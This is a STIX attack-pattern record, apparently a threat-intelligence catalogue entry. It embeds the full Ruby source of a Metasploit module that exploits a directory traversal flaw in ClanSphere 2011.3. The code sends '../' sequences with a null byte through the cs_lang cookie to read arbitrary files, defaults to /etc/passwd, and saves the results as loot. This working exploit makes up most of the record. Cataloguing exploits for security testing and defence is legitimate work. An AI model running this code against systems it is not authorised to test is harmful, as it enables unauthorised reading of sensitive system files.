{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32688243-d41d-4ffd-9ca4-3bbb97ba3d32",
    "created": "2024-08-14T16:31:04.461509Z",
    "modified": "2024-08-14T16:31:04.461513Z",
    "name": "ClanSphere 2011.3 Local File Inclusion Vulnerability",
    "description": " This module exploits a directory traversal flaw found in Clansphere 2011.3. The application fails to handle the cs_lang parameter properly, which can be used to read any file outside the virtual directory.  'References'     => [ ['OSVDB', '86720'] ['EDB', '22181'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/clansphere_traversal.rb",
            "external_id": "clansphere_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ClanSphere 2011.3 Local File Inclusion Vulnerability',\n      'Description'    => %q{\n        This module exploits a directory traversal flaw found in Clansphere 2011.3.\n        The application fails to handle the cs_lang parameter properly, which can be\n        used to read any file outside the virtual directory.\n      },\n      'References'     =>\n        [\n          ['OSVDB', '86720'],\n          ['EDB', '22181']\n        ],\n      'Author'         =>\n        [\n          'blkhtc0rp',  #Original\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-10-23'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),\n        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),\n        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])\n      ])\n  end\n\n\n  def run_host(ip)\n    base = normalize_uri(target_uri.path)\n\n    peer = \"#{ip}:#{rport}\"\n\n    print_status(\"Reading '#{datastore['FILE']}'\")\n\n    traverse = \"../\" * datastore['DEPTH']\n    f = datastore['FILE']\n    f = f[1, f.length] if f =~ /^\\//\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(base, \"index.php\"),\n      'cookie' => \"blah=blah; cs_lang=#{traverse}#{f}%00.png\"\n    })\n\n    if res and res.body =~ /^Fatal error\\:/\n      print_error(\"Unable to read '#{datastore['FILE']}', possibily because:\")\n      print_error(\"\\t1. File does not exist.\")\n      print_error(\"\\t2. No permission.\")\n      print_error(\"\\t3. #{ip} isn't vulnerable to null byte poisoning.\")\n\n    elsif res and res.code == 200\n      pattern_end = \"     UTC +1 - Load:\"\n      data = res.body.scan(/\\<div id\\=\\\"bottom\\\"\\>\\n(.+)\\n\\x20{5}UTC/).flatten[0].lstrip\n      fname = datastore['FILE']\n      p = store_loot(\n        'clansphere.cms',\n        'application/octet-stream',\n        ip,\n        data,\n        fname\n      )\n\n      vprint_line(data)\n      print_good(\"#{fname} stored as '#{p}'\")\n\n    else\n      print_error(\"Fail to obtain file for some unknown reason\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-23"
}